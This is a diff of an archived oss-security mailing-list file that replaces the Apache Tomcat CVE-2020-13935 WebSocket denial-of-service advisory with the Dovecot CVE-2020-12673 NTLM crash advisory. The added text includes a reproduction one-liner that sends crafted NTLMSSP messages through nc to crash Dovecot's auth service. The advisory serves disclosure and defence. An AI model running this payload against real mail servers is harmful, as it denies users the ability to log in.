@@ -1,40 +1,54 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/07/14/3
-Message-ID: <af5073bc-cbe7-29fb-9ae9-629e591aa8a9@apache.org>
-Date: Tue, 14 Jul 2020 13:24:15 +0100
-From: Mark Thomas <markt@...che.org>
-To: oss-security@...ts.openwall.com
-Subject: [SECURITY] CVE-2020-13935 Apache Tomcat WebSocket Denial of Service
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/08/12/2
+Message-ID: <dd509a99-f78b-dd33-eca9-f0404dd6e1a2@dovecot.fi>
+Date: Wed, 12 Aug 2020 16:10:04 +0300
+From: Aki Tuomi <aki.tuomi@...ecot.fi>
+To: oss-security <oss-security@...ts.openwall.com>, full-disclosure <full-disclosure@...ts.openwall.com>
+Subject: CVE-2020-12673: Dovecot IMAP server: Specially crafted NTLM package can crash auth service
 Content-Type: text/plain; charset=utf-8
 
-CVE-2020-13935 Apache Tomcat WebSocket Denial of Service
+Open-Xchange Security Advisory 2020-08-12
 
-Severity: Important
+Affected product: Dovecot IMAP server
+Internal reference: DOP-1870 (Bug ID)
+Vulnerability type: CWE-789 (Uncontrolled Memory Allocation)
+Vulnerable version: 2.2
+Vulnerable component: auth
+Fixed version: 2.3.11.3
+Report confidence: Confirmed
+Solution status: Fix available
+Vendor notification: 2020-05-03
+CVE reference: CVE-2020-12673
+CVSS: 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
 
-Vendor: The Apache Software Foundation
+Vulnerability Details:
+Dovecot's NTLM implementation does not correctly check message buffer
+size, which leads to reading past allocation which can lead to crash.
 
-Versions Affected:
-Apache Tomcat 10.0.0-M1 to 10.0.0-M6
-Apache Tomcat 9.0.0.M1 to 9.0.36
-Apache Tomcat 8.5.0 to 8.5.56
-Apache Tomcat 7.0.27 to 7.0.104
+Risk:
+An adversary can use this vulnerability to crash dovecot auth process
+repeatedly, preventing login.
 
-Description:
-The payload length in a WebSocket frame was not correctly validated.
-Invalid payload lengths could trigger an infinite loop. Multiple
-requests with invalid payload lengths could lead to a denial of service.
+Steps to reproduce:
+(echo 'AUTH NTLM'; echo -ne
+'NTLMSSP\x00\x01\x00\x00\x00\x00\x02\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
+| \
+base64 -w0 ;echo ;echo -ne
+'NTLMSSP\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00AA\x00\x00\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00orange\x00'|
+\
+base64 -w0;echo ; echo QUIT)  | nc 127.0.0.1 110
 
-Mitigation:
-- Upgrade to Apache Tomcat 10.0.0-M7 or later
-- Upgrade to Apache Tomcat 9.0.37 or later
-- Upgrade to Apache Tomcat 8.5.57 or later
+Workaround:
+Disable NTLM authentication.
 
-Credit:
-This issue was reported publicly via the Apache Tomcat Users mailing
-list without reference to the potential for DoS. The DoS risks were
-identified by the Apache Tomcat Security Team.
+Solution:
+Upgrade to fixed version.
 
-References:
-[1] http://tomcat.apache.org/security-10.html
-[2] http://tomcat.apache.org/security-9.html
-[3] http://tomcat.apache.org/security-8.html
+Best regards,
+Aki Tuomi
+Open-Xchange oy
+
+
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (489 bytes)
